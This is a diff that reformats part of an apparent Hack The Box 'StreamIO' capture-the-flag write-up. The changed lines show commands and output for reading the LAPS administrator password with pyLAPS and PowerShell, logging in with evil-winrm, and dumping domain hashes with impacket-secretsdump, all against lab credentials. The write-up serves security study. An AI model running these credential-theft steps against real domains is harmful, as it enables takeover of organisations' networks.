@@ -1012,8 +1012,8 @@ Members
 JDgodd                nikk37
 The command completed successfully.
 ```
-		- Now we have added JDgodd as member ( we can also add nikk37 instead ) we can attempt to read admin password with pyLAPS (https://github.com/p0dalirius/pyLAPS.git):
-			```bash
+- Now we have added JDgodd as member ( we can also add nikk37 instead ) we can attempt to read admin password with pyLAPS (https://github.com/p0dalirius/pyLAPS.git):
+```bash
 python3 pyLAPS.py --action get -d "streamio.htb" -u "JDgodd" -p "JDg0dd1s@d0p3cr3@t0r"
 
 ---OUTPUT---
@@ -1029,8 +1029,8 @@ python3 pyLAPS.py --action get -d "streamio.htb" -u "JDgodd" -p "JDg0dd1s@d0p3cr
   | DC$                  : ;8@1AIY4Pw[(f%
 [+] All done!
 ```
-		- If we added nikk37 instead (since we can access his acc via winrm):
-			```bash
+- If we added nikk37 instead (since we can access his acc via winrm):
+```bash
 Get-DomainObject DC -Credential $Cred -Properties "ms-mcs-AdmPwd",name
 
 ---OUTPUT---
@@ -1041,7 +1041,7 @@ DC
 
 ```
 - We can winrm into the machine with these credentials and grab root flag.
-	```bash
+```bash
 evil-winrm -u administrator -p ';8@1AIY4Pw[(f%' -i  10.10.11.158
 
 ---OUTPUT---
@@ -1057,13 +1057,13 @@ Info: Establishing connection to remote endpoint
 streamio\administrator
 
 ```
-	- Root flag in Martin's desktop
+- Root flag in Martin's desktop
 
 ---------------
 ## Extra
 - When i didnt find root flag in admin's desktop I thought maybe I needed to pivot to another user and was trying secretsdump to exploot DCSync..
-	- It wasn't required but this was the output:
-		```bash
+- It wasn't required but this was the output:
+```bash
 impacket-secretsdump 'streamio.htb'/'Administrator':';8@1AIY4Pw[(f%'@'streamio.htb'
 
 ---OUTPUT---
